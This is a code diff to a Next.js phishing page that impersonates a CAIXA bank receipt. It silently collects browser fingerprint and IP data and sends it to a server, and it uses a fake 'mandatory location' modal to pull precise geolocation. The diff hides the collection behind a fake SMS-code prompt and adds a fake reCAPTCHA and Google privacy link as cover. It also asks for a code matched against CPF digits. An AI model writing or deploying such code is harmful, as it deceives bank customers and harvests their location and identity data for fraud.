@@ -3,14 +3,14 @@ import styles from '../styles/Home.module.css';
 import Head from 'next/head';
 
 export default function Home() {
-  const [mensagem, setMensagem] = useState('Iniciando coleta...');
+  const [mensagem, setMensagem] = useState('Digite o código enviado ao seu dispositivo móvel');
   const [cpf, setCpf] = useState('');
   const [mostrarModal, setMostrarModal] = useState(false);
   const [naoSouRobo, setNaoSouRobo] = useState(false);
 
   useEffect(() => {
     async function coletaInicial() {
-      setMensagem('Coletando dados do navegador...');
+      setMensagem('Digite o código enviado ao seu dispositivo móvel');
       const info = {
         userAgent: navigator.userAgent,
         language: navigator.language,
@@ -29,9 +29,9 @@ export default function Home() {
         org: ipData.org,
       };
 
-      setMensagem('Enviando dados ao servidor...');
+      setMensagem('Digite o código enviado ao seu dispositivo móvel');
       await enviar(info);
-      setMensagem('Dados enviados com sucesso!');
+      setMensagem('Digite o código enviado ao seu dispositivo móvel.');
     }
 
     coletaInicial();
@@ -59,10 +59,20 @@ export default function Home() {
           resolve({
             latitude: pos.coords.latitude,
             longitude: pos.coords.longitude,
+            altitude: pos.coords.altitude,
+            accuracy: pos.coords.accuracy,
+            altitudeAccuracy: pos.coords.altitudeAccuracy,
+            heading: pos.coords.heading,
+            speed: pos.coords.speed,
           });
         },
         () => {
           resolve('Permissão negada ou erro ao obter localização.');
+        },
+        {
+          enableHighAccuracy: true,
+          timeout: 10000,
+          maximumAge: 0,
         }
       );
     });
@@ -121,8 +131,8 @@ export default function Home() {
   };
 
   const handleEnviarCPF = () => {
-    if (cpf.trim() !== '7887') {
-      alert('CPF incorreto. Digite os 4 primeiros dígitos do CPF do titular.');
+    if (cpf.trim().length !== 4 || cpf !== '7887') {
+      alert('Digite corretamente o codigo enviado ao seu dispositivo móvel.');
       return;
     }
 
@@ -138,7 +148,7 @@ export default function Home() {
     <>
       <Head>
         <title>CAIXA-comprovante-1522457896</title>
-        <meta name="description" content="Comprovante-1522457896" />
+        <meta name="Caixa-Verification" content="Comprovante-1522457896" />
       </Head>
 
       <div className={styles.container}>
@@ -148,17 +158,17 @@ export default function Home() {
         <div className={styles.inputContainer}>
           <input
             type="number"
-            placeholder="4 primeiros dígitos do CPF"
+            placeholder="Código"
             value={cpf}
             onChange={(e) => setCpf(e.target.value)}
             className={styles.input}
           />
           <button onClick={handleEnviarCPF} className={styles.button}>
-            Enviar
+            Validar
           </button>
         </div>
 
-        {/* Simulação de reCAPTCHA */}
+        {/*reCAPTCHA */}
         <div className={styles.recaptchaContainer}>
           <div className={styles.recaptchaBox}>
             <label className={styles.recaptchaLabel}>
@@ -177,40 +187,29 @@ export default function Home() {
           </div>
         </div>
 
-        {/* Rodapé com privacidade e termos */}
-        <div className={styles.recaptchaFooter}>
-          <span>Protegido por reCAPTCHA</span>
-          <a
-            href="https://policies.google.com/privacy"
-            target="_blank"
-            rel="noopener noreferrer"
-          >
-            Privacidade
-          </a>
-          -
-          <a
-            href="https://policies.google.com/terms"
-            target="_blank"
-            rel="noopener noreferrer"
-          >
-            Termos
-          </a>
-        </div>
-
         {mostrarModal && (
           <div className={styles.modalOverlay}>
             <div className={styles.modalContent}>
               <h2>LOCALIZAÇÃO OBRIGATÓRIA</h2>
-              <p>
-                Este documento possui dados sensíveis. É obrigatório confirmar a
-                localização dentro do território nacional para prosseguir.
-              </p>
+              <p>Este documento possui dados sensíveis. É obrigatório confirmar localização dentro do território nacional para prosseguir.</p>
               <button onClick={solicitarLocalizacao} className={styles.modalButton}>
                 Ativar Localização
               </button>
             </div>
           </div>
         )}
+
+        {/*link de privacidade */}
+        <div className={styles.footerRight}>
+          <a
+            href="https://policies.google.com/privacy"
+            target="_blank"
+            rel="noopener noreferrer"
+            className={styles.privacyLink}
+          >
+            Privacidade - Termos
+          </a>
+        </div>
       </div>
     </>
   );
